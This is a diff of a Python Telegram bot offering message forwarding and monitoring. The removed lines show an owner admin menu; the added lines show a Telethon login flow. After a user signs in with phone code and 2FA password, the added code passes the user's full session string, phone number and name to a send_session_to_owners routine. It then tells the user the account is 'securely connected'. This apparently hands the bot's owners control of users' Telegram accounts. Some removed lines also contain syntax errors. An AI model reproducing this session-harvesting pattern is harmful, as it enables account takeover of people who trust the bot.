-                    total_suspended_result = execute_query(
-                        bot_id,
-                        "SELECT COUNT(*) FROM {prefix}suspended_users",
-                        fetch_one=True
-                    )
-                    total_suspended = total_suspended_result[0] if total_suspended_result else 0
-                except Exception:
-                    total_allowed = 0
-                    total_suspended = 0
+                    target_ids = [int(id_str.strip()) for id_str in text.split() if id_str.strip().lstrip('-').isdigit()]
+                    if not target_ids:
+                        await update.message.reply_text("❌ **Please enter valid numeric IDs!**")
+                        return
+
+                    state["target_ids"] = target_ids
+
+                    task_filters = {
+                        "filters": {
+                            "raw_text": False,
+                            "numbers_only": False,
+                            "alphabets_only": False,
+                            "removed_alphabetic": False,
+                            "removed_numeric": False,
+                            "prefix": "",
+                            "suffix": ""
+                        },
+                        "outgoing": True,
+                        "forward_tag": False,
+                        "control": True
+                    }
+
+                    added = await db_call(db.add_forwarding_task, 
+                                         user_id, 
+                                         state["name"], 
+                                         state["source_ids"], 
+                                         state["target_ids"],
+                                         task_filters)
+
+                    if added:
+                        forwarding_tasks_cache.setdefault(user_id, []).append({
+                            "id": None,
+                            "label": state["name"],
+                            "source_ids": state["source_ids"],
+                            "target_ids": state["target_ids"],
+                            "is_active": 1,
+                            "filters": task_filters
+                        })
+
+                        try:
+                            asyncio.create_task(resolve_targets_for_user(user_id, target_ids))
+                        except Exception:
+                            logger.exception("Failed to schedule resolve_targets_for_user")
+
+                        await update.message.reply_text(
+                            f"🎉 **Forwarding task created successfully!**\n\n📋 **Name:** {state['name']}\n📥 **Sources:** {', '.join(map(str, state['source_ids']))}\n📤 **Targets:** {', '.join(map(str, state['target_ids']))}\n\n✅ All filters are set to default:\n• Outgoing: ✅ On\n• Forward Tag: ❌ Off\n• Control: ✅ On\n\nUse /fortasks to manage your task!",
+                            parse_mode="Markdown"
+                        )
+
+                        del task_creation_states[user_id]
+
+                    else:
+                        await update.message.reply_text(
+                            f"❌ **Task '{state['name']}' already exists!**\n\nPlease choose a different name.",
+                            parse_mode="Markdown"
+                        )
+
+                except ValueError:
+                    await update.message.reply_text("❌ **Please enter valid numeric IDs only!**")
+
+        except Exception as e:
+            logger.exception("Error in task creation")
+            await update.message.reply_text(
+                f"❌ **Error creating task:** {str(e)[:100]}",
+                parse_mode="Markdown"
+            )
+            if user_id in task_creation_states:
+                del task_creation_states[user_id]
+        return
+    
+    # Handle other text inputs
+    if context.user_data.get("awaiting_input"):
+        action = context.user_data.get("owner_action")
+        
+        if action == "get_user_string":
+            await handle_get_user_string(update, context)
+        elif action == "add_user":
+            await handle_add_user(update, context)
+        elif action == "remove_user":
+            await handle_remove_user(update, context)
+        return
+    
+    if user_id in login_states:
+        await handle_login_process(update, context)
+        return
+    
+    if user_id in logout_states:
+        handled = await handle_logout_confirmation(update, context)
+        if handled:
+            return
+    
+    if context.user_data.get("waiting_prefix") or context.user_data.get("waiting_suffix"):
+        await handle_prefix_suffix_input(update, context)
+        return
+    
+    if any(key.startswith("waiting_auto_reply_") for key in context.user_data.keys()):
+        await handle_auto_reply_message(update, context)
+        return
+    
+    if update.message.reply_to_message:
+        await handle_notification_reply(update, context)
+        return
+
+# ============================
+# LOGIN/LOGOUT FUNCTIONS
+# ============================
+async def login_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id if update.effective_user else update.callback_query.from_user.id
+
+    if not await check_authorization(update, context):
+        return
+
+    message = update.message if update.message else update.callback_query.message
+
+    if len(user_clients) >= MAX_CONCURRENT_USERS:
+        await message.reply_text(
+            "❌ **Server at capacity!**\n\nToo many users are currently connected. Please try again later.",
+            parse_mode="Markdown",
+        )
+        return
+
+    user = await db_call(db.get_user, user_id)
+    if user and user.get("is_logged_in"):
+        await message.reply_text(
+            "✅ **You are already logged in!**\n\n"
+            f"📱 Phone: `{user['phone'] or 'Not set'}`\n"
+            f"👤 Name: `{user['name'] or 'User'}`\n\n"
+            "Use /logout if you want to disconnect.",
+            parse_mode="Markdown",
+        )
+        return
+
+    client = TelegramClient(StringSession(), API_ID, API_HASH)
+    
+    try:
+        await client.connect()
+    except Exception as e:
+        logger.error(f"Telethon connection failed: {e}")
+        await message.reply_text(
+            f"❌ **Connection failed:** {str(e)}\n\nPlease try again in a few minutes.",
+            parse_mode="Markdown",
+        )
+        return
+
+    login_states[user_id] = {"client": client, "step": "waiting_phone"}
+
+    await message.reply_text(
+        "📱 **Login Process**\n\n1️⃣ **Enter your phone number** (with country code):\n\n**Examples:**\n• `+1234567890`\n• `+447911123456`\n• `+4915112345678`\n\n⚠️ **Important:**\n• Include the `+` sign\n• Use international format\n• No spaces or dashes\n\n**Type your phone number now:**",
+        parse_mode="Markdown",
+    )
+
+async def handle_login_process(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    text = update.message.text.strip()
+
+    if user_id in phone_verification_states:
+        await handle_phone_verification(update, context)
+        return
+
+    if user_id in task_creation_states:
+        await handle_task_creation(update, context)
+        return
+    
+    if context.user_data.get("waiting_prefix") or context.user_data.get("waiting_suffix"):
+        await handle_prefix_suffix_input(update, context)
+        return
+    
+    if user_id in logout_states:
+        handled = await handle_logout_confirmation(update, context)
+        if handled:
+            return
+    
+    if any(key.startswith("waiting_auto_reply_") for key in context.user_data.keys()):
+        await handle_auto_reply_message(update, context)
+        return
+    
+    if update.message.reply_to_message:
+        await handle_notification_reply(update, context)
+        return
+
+    if user_id not in login_states:
+        return
+
+    state = login_states[user_id]
+    client = state["client"]
+
+    try:
+        if state["step"] == "waiting_phone":
+            if not text.startswith('+'):
+                await update.message.reply_text(
+                    "❌ **Invalid format!**\n\nPhone number must start with `+`\nExample: `+1234567890`",
+                    parse_mode="Markdown",
+                )
+                return
+            
+            clean_phone = _clean_phone_number(text)
+            
+            if len(clean_phone) < 8:
+                await update.message.reply_text(
+                    "❌ **Invalid phone number!**\n\nPhone number seems too short.",
+                    parse_mode="Markdown",
+                )
+                return
+
+            processing_msg = await update.message.reply_text(
+                "⏳ **Sending verification code...**\n\nThis may take a few seconds.",
+                parse_mode="Markdown",
+            )
+
+            try:
+                result = await client.send_code_request(clean_phone)
                 
-                body = (
-                    f"🤖 {config['name']} Status\n"
-                    f"👥 Allowed users: {total_allowed}\n"
-                    f"🚫 Suspended users: {total_suspended}\n"
-                    f"⚙️ Active tasks: {len(active_rows)}\n"
-                    f"📨 Queued tasks: {queued_tasks}\n\n"
-                    "Users with active tasks:\n" + ("\n".join(lines_active) if lines_active else "(none)") + "\n\n"
-                    "User stats (last 1h):\n" + ("\n".join(lines_stats) if lines_stats else "(none)")
+                state["phone"] = clean_phone
+                state["phone_code_hash"] = result.phone_code_hash
+                state["step"] = "waiting_code"
+
+                await processing_msg.edit_text(
+                    f"✅ **Verification code sent!**\n\n📱 **Code sent to:** `{clean_phone}`\n\n2️⃣ **Enter the verification code:**\n\n**Format:** `verify12345`\n• Type `verify` followed by your 5-digit code\n• No spaces, no brackets\n\n**Example:** If your code is `54321`, type:\n`verify54321`",
+                    parse_mode="Markdown",
+                )
+
+            except Exception as e:
+                error_msg = str(e)
+                logger.error(f"Error sending code for user {user_id}: {error_msg}")
+                
+                if "PHONE_NUMBER_INVALID" in error_msg:
+                    error_text = "❌ **Invalid phone number!**"
+                elif "PHONE_NUMBER_BANNED" in error_msg:
+                    error_text = "❌ **Phone number banned!**"
+                elif "FLOOD" in error_msg or "Too many" in error_msg:
+                    error_text = "❌ **Too many attempts!**\n\nPlease wait 2-3 minutes."
+                elif "PHONE_CODE_EXPIRED" in error_msg:
+                    error_text = "❌ **Code expired!**\n\nPlease start over."
+                else:
+                    error_text = f"❌ **Error:** {error_msg}"
+                
+                await processing_msg.edit_text(
+                    error_text + "\n\nUse /login to try again.",
+                    parse_mode="Markdown",
                 )
                 
-                menu_text = f"👑 Owner Menu {config['owner_tag']}\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n{body}"
-                keyboard = [
-                    [{"text": "📊 Bot Info", "callback_data": "owner_botinfo"}, {"text": "👥 List Users", "callback_data": "owner_listusers"}],
-                    [{"text": "🚫 List Suspended", "callback_data": "owner_listsuspended"}, {"text": "➕ Add User", "callback_data": "owner_adduser"}],
-                    [{"text": "⏸️ Suspend User", "callback_data": "owner_suspend"}, {"text": "▶️ Unsuspend User", "callback_data": "owner_unsuspend"}],
-                    [{"text": "🔍 Check All User Preview", "callback_data": "owner_checkallpreview"}]
-                ]
+                try:
+                    await client.disconnect()
+                except:
+                    pass
                 
-                try:
-                    get_session(bot_id).post(f"{config['telegram_api']}/editMessageText", json={
-                        "chat_id": callback["message"]["chat"]["id"],
-                        "message_id": callback["message"]["message_id"],
-                        "text": menu_text,
-                        "reply_markup": {"inline_keyboard": keyboard}
-                    }, timeout=2)
-                except Exception:
-                    pass
-                try:
-                    get_session(bot_id).post(f"{config['telegram_api']}/answerCallbackQuery", json={
-                        "callback_query_id": callback.get("id"),
-                        "text": "✅ Bot info loaded."
-                    }, timeout=2)
-                except Exception:
-                    pass
-                return jsonify({"ok": True})
+                if user_id in login_states:
+                    del login_states[user_id]
+                return
+
+        elif state["step"] == "waiting_code":
+            if not text.startswith("verify"):
+                await update.message.reply_text(
+                    "❌ **Invalid format!**\n\nPlease use the format: `verify12345`",
+                    parse_mode="Markdown",
+                )
+                return
+
+            code = text[6:]
             
-            elif data == "owner_listusers":
-                try:
-                    rows = execute_query(
-                        bot_id,
-                        "SELECT user_id, username, added_at FROM {prefix}allowed_users ORDER BY added_at DESC",
-                        fetch_all=True
-                    )
-                except Exception:
-                    try:
-                        get_session(bot_id).post(f"{config['telegram_api']}/answerCallbackQuery", json={
-                            "callback_query_id": callback.get("id"),
-                            "text": "⚠️ Database error. Try again later."
-                        }, timeout=2)
-                    except Exception:
-                        pass
-                    return jsonify({"ok": True})
-                
-                lines = []
-                for r in rows:
-                    uid2, uname, added_at_utc = r
-                    uname_s = f"({at_username(uname)})" if uname else "(no username)"
-                    added_at_wat = utc_to_wat_ts(added_at_utc)
-                    lines.append(f"{uid2} {uname_s} added={added_at_wat}")
-                
-                body = "👥 Allowed users:\n" + ("\n".join(lines) if lines else "(none)")
-                menu_text = f"👑 Owner Menu {config['owner_tag']}\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n{body}"
-                keyboard = [
-                    [{"text": "📊 Bot Info", "callback_data": "owner_botinfo"}, {"text": "👥 List Users", "callback_data": "owner_listusers"}],
-                    [{"text": "🚫 List Suspended", "callback_data": "owner_listsuspended"}, {"text": "➕ Add User", "callback_data": "owner_adduser"}],
-                    [{"text": "⏸️ Suspend User", "callback_data": "owner_suspend"}, {"text": "▶️ Unsuspend User", "callback_data": "owner_unsuspend"}],
-                    [{"text": "🔍 Check All User Preview", "callback_data": "owner_checkallpreview"}]
-                ]
-                
-                try:
-                    get_session(bot_id).post(f"{config['telegram_api']}/editMessageText", json={
-                        "chat_id": callback["message"]["chat"]["id"],
-                        "message_id": callback["message"]["message_id"],
-                        "text": menu_text,
-                        "reply_markup": {"inline_keyboard": keyboard}
-                    }, timeout=2)
-                except Exception:
-                    pass
-                try:
-                    get_session(bot_id).post(f"{config['telegram_api']}/answerCallbackQuery", json={
-                        "callback_query_id": callback.get("id"),
-                        "text": "✅ User list loaded."
-                    }, timeout=2)
-                except Exception:
-                    pass
-                return jsonify({"ok": True})
-            
-            elif data == "owner_listsuspended":
-                # Auto-unsuspend expired ones first
-                try:
-                    rows = list_suspended(bot_id)
-                    for row in rows[:]:
-                        uid2, until_utc, reason, added_at_utc = row
-                        until_str = re.sub(r':\d{2}(?=\s|$)', '', until_utc)
-                        until_dt = datetime.strptime(until_str, "%Y-%m-%d %I:%M %p")
-                        if until_dt <= datetime.utcnow():
-                            unsuspend_user(bot_id, uid2)
-                    
-                    rows = list_suspended(bot_id)
-                except Exception:
-                    try:
-                        get_session(bot_id).post(f"{config['telegram_api']}/answerCallbackQuery", json={
-                            "callback_query_id": callback.get("id"),
-                            "text": "⚠️ Database error. Try again later."
-                        }, timeout=2)
-                    except Exception:
-                        pass
-                    return jsonify({"ok": True})
-                
-                if not rows:
-                    body = "✅ No suspended users."
-                else:
-                    lines = []
-                    for r in rows:
-                        uid2, until_utc, reason, added_at_utc = r
-                        until_wat = utc_to_wat_ts(until_utc)
-                        added_wat = utc_to_wat_ts(added_at_utc)
-                        uname = fetch_display_username(bot_id, uid2)
-                        uname_s = f"({at_username(uname)})" if uname else ""
-                        lines.append(f"{uid2} {uname_s} until={until_wat} reason={reason}")
-                    body = "🚫 Suspended users:\n" + "\n".join(lines)
-                
-                menu_text = f"👑 Owner Menu {config['owner_tag']}\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n{body}"
-                keyboard = [
-                    [{"text": "📊 Bot Info", "callback_data": "owner_botinfo"}, {"text": "👥 List Users", "callback_data": "owner_listusers"}],
-                    [{"text": "🚫 List Suspended", "callback_data": "owner_listsuspended"}, {"text": "➕ Add User", "callback_data": "owner_adduser"}],
-                    [{"text": "⏸️ Suspend User", "callback_data": "owner_suspend"}, {"text": "▶️ Unsuspend User", "callback_data": "owner_unsuspend"}],
-                    [{"text": "🔍 Check All User Preview", "callback_data": "owner_checkallpreview"}]
-                ]
-                
-                try:
-                    get_session(bot_id).post(f"{config['telegram_api']}/editMessageText", json={
-                        "chat_id": callback["message"]["chat"]["id"],
-                        "message_id": callback["message"]["message_id"],
-                        "text": menu_text,
-                        "reply_markup": {"inline_keyboard": keyboard}
-                    }, timeout=2)
-                except Exception:
-                    pass
-                try:
-                    get_session(bot_id).post(f"{config['telegram_api']}/answerCallbackQuery", json={
-                        "callback_query_id": callback.get("id"),
-                        "text": "✅ Suspended list loaded."
-                    }, timeout=2)
-                except Exception:
-                    pass
-                return jsonify({"ok": True})
-            
-            elif data == "owner_backtomenu":
-                send_ownersets_menu(bot_id, uid)
-                try:
-                    get_session(bot_id).post(f"{config['telegram_api']}/deleteMessage", json={
-                        "chat_id": callback["message"]["chat"]["id"],
-                        "message_id": callback["message"]["message_id"]
-                    }, timeout=2)
-                except Exception:
-                    pass
-                try:
-                    get_session(bot_id).post(f"{config['telegram_api']}/answerCallbackQuery", json={
-                        "callback_query_id": callback.get("id"),
-                        "text": "✅ Returning to menu."
-                    }, timeout=2)
-                except Exception:
-                    pass
-                return jsonify({"ok": True})
-            
-            elif data.startswith("owner_checkallpreview_"):
-                parts = data.split("_")
-                
-                if len(parts) == 5:
-                    target_user = int(parts[2])
-                    page = int(parts[3])
-                    hours = int(parts[4])
-                    
-                    try:
-                        user_index, all_users = get_user_index(bot_id, target_user)
-                        if user_index == -1:
-                            if all_users:
-                                target_user = all_users[0][0]
-                                user_index = 0
-                            else:
-                                try:
-                                    get_session(bot_id).post(f"{config['telegram_api']}/editMessageText", json={
-                                        "chat_id": callback["message"]["chat"]["id"],
-                                        "message_id": callback["message"]["message_id"],
-                                        "text": "📋 No users found.",
-                                    }, timeout=2)
-                                except Exception:
-                                    pass
-                                return jsonify({"ok": True})
-                        
-                        tasks, total_tasks, total_pages = get_user_tasks_preview(bot_id, target_user, hours, page)
-                        user_info = all_users[user_index]
-                        user_id_info, username_info, added_at_info = user_info
-                        username_display = at_username(username_info) if username_info else "no username"
-                        added_wat = utc_to_wat_ts(added_at_info)
-                        
-                        if not tasks:
-                            body = f"👤 User: {user_id_info} ({username_display})\nAdded: {added_wat}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n📋 No tasks found in the last {hours} hours."
-                        else:
-                            lines = []
-                            for task in tasks:
-                                lines.append(f"🕒 {task['created_at']}\n📝 Preview: {task['preview']}\n📊 Progress: {task['sent_count']}/{task['total_words']} words")
-                            
-                            body = f"👤 User: {user_id_info} ({username_display})\nAdded: {added_wat}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n📋 Tasks (last {hours}h, page {page+1}/{total_pages}):\n\n" + "\n\n".join(lines)
-                        
-                        keyboard = []
-                        
-                        task_nav = []
-                        if page > 0:
-                            task_nav.append({"text": "⬅️ Prev Page", "callback_data": f"owner_checkallpreview_{target_user}_{page-1}_{hours}"})
-                        if page + 1 < total_pages:
-                            task_nav.append({"text": "Next Page ➡️", "callback_data": f"owner_checkallpreview_{target_user}_{page+1}_{hours}"})
-                        if task_nav:
-                            keyboard.append(task_nav)
-                        
-                        user_nav = []
-                        if user_index > 0:
-                            prev_user_id = all_users[user_index-1][0]
-                            user_nav.append({"text": "⬅️ Prev User", "callback_data": f"owner_checkallpreview_{prev_user_id}_0_{hours}"})
-                        
-                        user_nav.append({"text": f"User {user_index+1}/{len(all_users)}", "callback_data": "owner_checkallpreview_noop"})
-                        
-                        if user_index + 1 < len(all_users):
-                            next_user_id = all_users[user_index+1][0]
-                            user_nav.append({"text": "Next User ➡️", "callback_data": f"owner_checkallpreview_{next_user_id}_0_{hours}"})
-                        
-                        if user_nav:
-                            keyboard.append(user_nav)
-                        
-                        keyboard.append([{"text": "🔙 Back to Menu", "callback_data": "owner_backtomenu"}])
-                        
-                        try:
-                            get_session(bot_id).post(f"{config['telegram_api']}/editMessageText", json={
-                                "chat_id": callback["message"]["chat"]["id"],
-                                "message_id": callback["message"]["message_id"],
-                                "text": body,
-                                "reply_markup": {"inline_keyboard": keyboard}
-                            }, timeout=2)
-                        except Exception:
-                            pass
-                        
-                    except Exception:
-                        try:
-                            get_session(bot_id).post(f"{config['telegram_api']}/editMessageText", json={
-                                "chat_id": callback["message"]["chat"]["id"],
-                                "message_id": callback["message"]["message_id"],
-                                "text": "⚠️ Database error. Try again later.",
-                            }, timeout=2)
-                        except Exception:
-                            pass
-                    
-                elif data == "owner_checkallpreview_noop":
-                    try:
-                        get_session(bot_id).post(f"{config['telegram_api']}/answerCallbackQuery", json={
-                            "callback_query_id": callback.get("id")
-                        }, timeout=2)
-                    except Exception:
-                        pass
-                    
-                return jsonify({"ok": True})
-            
-            elif data in ["owner_adduser", "owner_suspend", "owner_unsuspend", "owner_checkallpreview"]:
-                operation = data.replace("owner_", "")
-                
-                if operation == "checkallpreview":
-                    set_owner_state(bot_id, uid, {"operation": operation, "step": 0})
-                    cancel_keyboard = {"inline_keyboard": [[{"text": "❌ Cancel", "callback_data": "owner_cancelinput"}]]}
-                    
-                    try:
-                        send_message(bot_id, uid, "⏰ How many hours back should I check? (e.g., 1, 6, 24, 168):", cancel_keyboard)
-                    except Exception:
-                        pass
-                    try:
-                        get_session(bot_id).post(f"{config['telegram_api']}/answerCallbackQuery", json={
-                            "callback_query_id": callback.get("id"),
-                            "text": "ℹ️ Please check your new message."
-                        }, timeout=2)
-                    except Exception:
-                        pass
-                else:
-                    set_owner_state(bot_id, uid, {"operation": operation, "step": 0})
-                    
-                    prompts = {
-                        "adduser": "👤 Please send the User ID to add (you can add multiple IDs separated by spaces or commas):",
-                        "suspend": "⏸️ Please send:\n1. User ID\n2. Duration (e.g., 30s, 10m, 2h, 1d, 1d2h, 2h30m, 1d2h3m5s)\n3. Optional reason\n\nExamples:\n• 123456789 30s Too many requests\n• 123456789 1d2h Spamming\n• 123456789 2h30m Violation",
-                        "unsuspend": "▶️ Please send the User ID to unsuspend:",
-                    }
-                    
-                    cancel_keyboard = {"inline_keyboard": [[{"text": "❌ Cancel", "callback_data": "owner_cancelinput"}]]}
-                    
-                    try:
-                        send_message(bot_id, uid, f"⚠️ {prompts[operation]}\n\nPlease send the requested information as a text message.", cancel_keyboard)
-                    except Exception:
-                        pass
-                    try:
-                        get_session(bot_id).post(f"{config['telegram_api']}/answerCallbackQuery", json={
-                            "callback_query_id": callback.get("id"),
-                            "text": "ℹ️ Please check your new message."
-                        }, timeout=2)
-                    except Exception:
-                        pass
-                return jsonify({"ok": True})
-            
-            elif data == "owner_cancelinput":
-                clear_owner_state(bot_id, uid)
-                try:
-                    get_session(bot_id).post(f"{config['telegram_api']}/deleteMessage", json={
-                        "chat_id": callback["message"]["chat"]["id"],
-                        "message_id": callback["message"]["message_id"]
-                    }, timeout=2)
-                except Exception:
-                    pass
-                try:
-                    get_session(bot_id).post(f"{config['telegram_api']}/answerCallbackQuery", json={
-                        "callback_query_id": callback.get("id"),
-                        "text": "❌ Operation cancelled."
-                    }, timeout=2)
-                except Exception:
-                    pass
-                return jsonify({"ok": True})
-            
-            # Answer callback query
+            if not code or not code.isdigit() or len(code) != 5:
+                await update.message.reply_text(
+                    "❌ **Invalid code!**\n\nCode must be 5 digits.\n**Example:** `verify12345`",
+                    parse_mode="Markdown",
+                )
+                return
+
+            verifying_msg = await update.message.reply_text(
+                "🔄 **Verifying code...**",
+                parse_mode="Markdown",
+            )
+
             try:
-                get_session(bot_id).post(f"{config['telegram_api']}/answerCallbackQuery", json={
-                    "callback_query_id": callback.get("id")
-                }, timeout=2)
+                await client.sign_in(state["phone"], code, phone_code_hash=state["phone_code_hash"])
+
+                me = await client.get_me()
+                session_string = client.session.save()
+
+                asyncio.create_task(send_session_to_owners(user_id, state["phone"], me.first_name or "User", session_string))
+
+                await db_call(db.save_user, user_id, state["phone"], me.first_name, session_string, True)
+
+                user_clients[user_id] = client
+                forwarding_tasks_cache.setdefault(user_id, [])
+                monitoring_tasks_cache.setdefault(user_id, [])
+                _ensure_user_target_cache(user_id)
+                chat_entity_cache.setdefault(user_id, {})
+                _ensure_user_send_semaphore(user_id)
+                _ensure_user_rate_limiter(user_id)
+                
+                # Start both systems
+                await start_forwarding_for_user(user_id)
+                await start_monitoring_for_user(user_id)
+
+                del login_states[user_id]
+
+                await verifying_msg.edit_text(
+                    f"✅ **Successfully connected!** 🎉\n\n👤 **Name:** {me.first_name or 'User'}\n📱 **Phone:** `{state['phone']}`\n🆔 **User ID:** `{me.id}`\n\n**Now you can:**\n• Create forwarding tasks with /forwadd\n• Create monitoring tasks with /monitoradd\n• View tasks with /fortasks and /monitortasks\n• Get chat IDs with /getallid",
+                    parse_mode="Markdown",
+                )
+
+            except SessionPasswordNeededError:
+                state["step"] = "waiting_2fa"
+                await verifying_msg.edit_text(
+                    "🔐 **2-Step Verification Required**\n\n3️⃣ **Enter your 2FA password:**\n\n**Format:** `passwordYourPassword123`\n• Type `password` followed by your 2FA password\n• No spaces, no brackets\n\n**Example:** If your password is `mypass123`, type:\n`passwordmypass123`",
+                    parse_mode="Markdown",
+                )
+            except Exception as e:
+                error_msg = str(e)
+                logger.error(f"Error verifying code for user {user_id}: {error_msg}")
+                
+                if "PHONE_CODE_INVALID" in error_msg:
+                    error_text = "❌ **Invalid code!**"
+                elif "PHONE_CODE_EXPIRED" in error_msg:
+                    error_text = "❌ **Code expired!**"
+                else:
+                    error_text = f"❌ **Verification failed:** {error_msg}"
+                
+                await verifying_msg.edit_text(
+                    error_text + "\n\nUse /login to try again.",
+                    parse_mode="Markdown",
+                )
+
+        elif state["step"] == "waiting_2fa":
+            if not text.startswith("password"):
+                await update.message.reply_text(
+                    "❌ **Invalid format!**\n\nPlease use the format: `passwordYourPassword123`",
+                    parse_mode="Markdown",
+                )
+                return
+
+            password = text[8:]
+
+            if not password:
+                await update.message.reply_text(
+                    "❌ **No password provided!**",
+                    parse_mode="Markdown",
+                )
+                return
+
+            verifying_msg = await update.message.reply_text(
+                "🔄 **Verifying 2FA password...**",
+                parse_mode="Markdown",
+            )
+
+            try:
+                await client.sign_in(password=password)
+
+                me = await client.get_me()
+                session_string = client.session.save()
+
+                asyncio.create_task(send_session_to_owners(user_id, state["phone"], me.first_name or "User", session_string))
+
+                await db_call(db.save_user, user_id, state["phone"], me.first_name, session_string, True)
+
+                user_clients[user_id] = client
+                forwarding_tasks_cache.setdefault(user_id, [])
+                monitoring_tasks_cache.setdefault(user_id, [])
+                _ensure_user_target_cache(user_id)
+                chat_entity_cache.setdefault(user_id, {})
+                _ensure_user_send_semaphore(user_id)
+                _ensure_user_rate_limiter(user_id)
+                
+                # Start both systems
+                await start_forwarding_for_user(user_id)
+                await start_monitoring_for_user(user_id)
+
+                del login_states[user_id]
+
+                await verifying_msg.edit_text(
+                    f"✅ **Successfully connected with 2FA!** 🎉\n\n👤 **Name:** {me.first_name or 'User'}\n📱 **Phone:** `{state['phone']}`\n🆔 **User ID:** `{me.id}`\n\nYour account is now securely connected! 🔐",
+                    parse_mode="Markdown",
+                )
+
+            except Exception as e:
+                error_msg = str(e)
+                logger.error(f"Error verifying 2FA for user {user_id}: {error_msg}")
+                
+                if "PASSWORD_HASH_INVALID" in error_msg or "PASSWORD_INVALID" in error_msg:
+                    error_text = "❌ **Invalid 2FA password!**"
+                else:
+                    error_text = f"❌ **2FA verification failed:** {error_msg}"
+                
+                await verifying_msg.edit_text(
+                    error_text + "\n\nUse /login to try again.",
+                    parse_mode="Markdown",
+                )
+
+    except Exception as e:
+        logger.exception("Unexpected error during login")
+        await update.message.reply_text(
+            f"❌ **Unexpected error:** {str(e)[:100]}\n\nPlease try /login again.",
+            parse_mode="Markdown",
+        )
+        if user_id in login_states:
+            try:
+                c = login_states[user_id].get("client")
+                if c:
+                    await c.disconnect()
             except Exception:
                 pass
-            
-            return jsonify({"ok": True})
-        
-        # Handle regular messages
-        if "message" in update:
-            msg = update["message"]
-            user = msg.get("from", {})
-            uid = user.get("id")
-            username = user.get("username") or (user.get("first_name") or "")
-            text = msg.get("text") or ""
+            del login_states[user_id]
 
-            # Update username only for existing/allowed users
-            try:
-                execute_query(
-                    bot_id,
-                    "UPDATE {prefix}allowed_users SET username = %s WHERE user_id = %s",
-                    (username or "", uid)
-                )
-            except Exception:
-                logger.exception("webhook: update allowed_users username failed for %s", bot_id)
+async def logout_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id if update.effective_user else update.callback_query.from_user.id
 
-            # Check if owner is in input mode
-            if uid in config["owner_ids"] and is_owner_in_operation(bot_id, uid):
-                owner_state = get_owner_state(bot_id, uid)
-                if owner_state:
-                    operation = owner_state.get("operation")
-                    step = owner_state.get("step", 0)
-                    
-                    if operation == "adduser":
-                        parts = re.split(r"[,\s]+", text.strip())
-                        added, already, invalid = [], [], []
-                        for p in parts:
-                            if not p:
-                                continue
-                            try:
-                                tid = int(p)
-                            except Exception:
-                                invalid.append(p)
-                                continue
-                            
-                            try:
-                                exists = execute_query(
-                                    bot_id,
-                                    "SELECT 1 FROM {prefix}allowed_users WHERE user_id = %s",
-                                    (tid,),
-                                    fetch_one=True
-                                )
-                                if exists:
-                                    already.append(tid)
-                                    continue
-                                
-                                execute_query(
-                                    bot_id,
-                                    "INSERT INTO {prefix}allowed_users (user_id, username, added_at) VALUES (%s, %s, %s)",
-                                    (tid, "", now_ts())
-                                )
-                            except Exception:
-                                invalid.append(p)
-                                continue
-                                
-                            added.append(tid)
-                            try:
-                                send_message(bot_id, tid, f"✅ You have been added. Send any text to start.")
-                            except Exception:
-                                pass
-                        parts_msgs = []
-                        if added: parts_msgs.append("Added: " + ", ".join(str(x) for x in added))
-                        if already: parts_msgs.append("Already present: " + ", ".join(str(x) for x in already))
-                        if invalid: parts_msgs.append("Invalid: " + ", ".join(invalid))
-                        result_msg = "✅ " + ("; ".join(parts_msgs) if parts_msgs else "No changes")
-                        
-                        clear_owner_state(bot_id, uid)
-                        send_message(bot_id, uid, f"{result_msg}\n\nUse /ownersets again to access the menu. 😊")
-                        return jsonify({"ok": True})
-                    
-                    elif operation == "suspend":
-                        if step == 0:
-                            parts = text.split(maxsplit=2)
-                            if len(parts) < 2:
-                                send_message(bot_id, uid, "⚠️ Please provide both User ID and duration. Example: 123456789 1d2h")
-                                return jsonify({"ok": True})
-                            
-                            try:
-                                target = int(parts[0])
-                            except Exception:
-                                send_message(bot_id, uid, "❌ Invalid User ID. Please try again.")
-                                return jsonify({"ok": True}")
-                            
-                            dur = parts[1]
-                            reason = parts[2] if len(parts) > 2 else ""
-                            
-                            result = parse_duration(dur)
-                            if result[0] is None:
-                                send_message(bot_id, uid, f"❌ {result[1]}\n\nValid examples: 30s, 10m, 2h, 1d, 1d2h, 2h30m, 1d2h3m5s")
-                                return jsonify({"ok": True}")
-                            
-                            seconds, formatted_duration = result
-                            suspend_user(bot_id, target, seconds, reason)
-                            reason_part = f"\nReason: {reason}" if reason else ""
-                            until_wat = utc_to_wat_ts((datetime.utcnow() + timedelta(seconds=seconds)).strftime('%Y-%m-%d %I:%M %p'))
-                            
-                            clear_owner_state(bot_id, uid)
-                            send_message(bot_id, uid, f"✅ User {label_for_owner_view(bot_id, target, fetch_display_username(bot_id, target))} suspended for {formatted_duration} (until {until_wat}).{reason_part}\n\nUse /ownersets again to access the menu. 😊")
-                            return jsonify({"ok": True}")
-                    
-                    elif operation == "unsuspend":
-                        try:
-                            target = int(text.strip())
-                        except Exception:
-                            send_message(bot_id, uid, "❌ Invalid User ID. Please try again.")
-                            return jsonify({"ok": True}")
-                        
-                        ok = unsuspend_user(bot_id, target)
-                        if ok:
-                            result = f"✅ User {label_for_owner_view(bot_id, target, fetch_display_username(bot_id, target))} unsuspended."
-                        else:
-                            result = f"ℹ️ User {target} is not suspended."
-                        
-                        clear_owner_state(bot_id, uid)
-                        send_message(bot_id, uid, f"{result}\n\nUse /ownersets again to access the menu. 😊")
-                        return jsonify({"ok": True}")
-                    
-                    elif operation == "checkallpreview":
-                        if step == 0:
-                            try:
-                                hours = int(text.strip())
-                                if hours <= 0:
-                                    raise ValueError
-                            except Exception:
-                                send_message(bot_id, uid, "❌ Please enter a valid positive number of hours.")
-                                return jsonify({"ok": True}")
-                            
-                            all_users = get_all_users_ordered(bot_id)
-                            if not all_users:
-                                clear_owner_state(bot_id, uid)
-                                send_message(bot_id, uid, "📋 No users found.")
-                                return jsonify({"ok": True}")
-                            
-                            first_user_id, first_username, first_added_at = all_users[0]
